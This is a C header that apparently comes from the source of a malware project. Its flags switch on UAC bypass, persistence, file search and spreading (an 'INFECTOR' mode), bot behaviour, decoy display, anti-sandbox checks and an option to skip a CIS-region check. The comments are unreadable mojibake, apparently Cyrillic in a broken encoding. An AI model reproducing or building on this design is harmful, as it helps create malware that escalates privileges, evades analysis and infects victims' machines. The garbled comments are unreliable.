#pragma once

#include <Windows.h>
#include <stdio.h>
#include <wchar.h>

#define DEREF_32(name)*(DWORD*)(name)
#define DEREF_16(name)*(WORD*)(name)

#define CAPSID_ALIGNMENT 4096

// ��� ���������� ������� ����� ����� ����������� extended_data � ���������� ����������, ������ ���������������� � ����������� �������
// ��� ������� �� �������� ����� ��� ������.
#define M0YV_USE_PROPFLAG (DWORD)1 
// �������� �� ������ � traverse
#define M0YV_FNO_SEARCH (DWORD)2 
// ��������� ��������� �����������
#define M0YV_FNO_PERSIST (DWORD)4 
// ��������� ������ ���� ��� ������������� ������� �����
#define M0YV_FNO_BOT (DWORD)8 
// ���������� ����� ���� ��� ������ ��� ����� ����� � ���������� IL
#define M0YV_USE_UACBYPASS (DWORD)16 
// �� ���������� ���������� �� ������� ����, �������� ������ ����� ExitThread
#define M0YV_FNO_RET (DWORD)32 
// ���������� DECOY ����� ��� ���������� �������
#define M0YV_USE_DECOY (DWORD)64
// ��������� �������� �� CIS - ����������� ������ ����� ���� ������ � ����� ������
#define DBGM0YV_FNO_CIS_CHECK (DWORD)128
// ��������� �������� �� ���������
#define M0YV_FNO_ANTISBX (DWORD)256

// ��������� ��������
#define M0YV_FNO_INFECTOR M0YV_FNO_PERSIST | M0YV_FNO_SEARCH
